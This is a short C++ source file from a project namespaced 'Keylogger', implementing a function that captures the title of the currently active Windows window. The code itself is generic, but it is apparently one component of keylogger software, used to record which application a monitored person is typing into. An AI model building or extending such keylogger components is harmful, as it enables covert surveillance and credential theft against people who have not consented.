#include "WindowHandlerWindows.h"

#include <windows.h>

#define WINDOW_MAX 1024

namespace Keylogger {

std::string WindowHandlerWindows::getWindowString() {
	char buf[WINDOW_MAX];
	GetWindowTextA(GetForegroundWindow(), buf, WINDOW_MAX);
	return std::string(buf);
}

}